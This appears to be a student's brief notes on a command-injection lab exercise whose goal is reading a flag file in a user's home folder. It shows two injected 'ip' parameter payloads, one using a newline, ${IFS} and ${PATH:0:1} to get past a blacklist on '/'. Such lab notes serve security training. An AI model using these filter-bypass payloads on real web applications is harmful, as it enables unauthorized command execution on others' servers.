 ## Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found. 
- ip=127.0.0.1&${IFS}ls${IFS}/home it doesnt work cuz of / which is blacklisted by Web app
- ip=127.0.0.1%0a${IFS}ls${IFS}${PATH:0:1}home work cuz of "encoded" "/" character
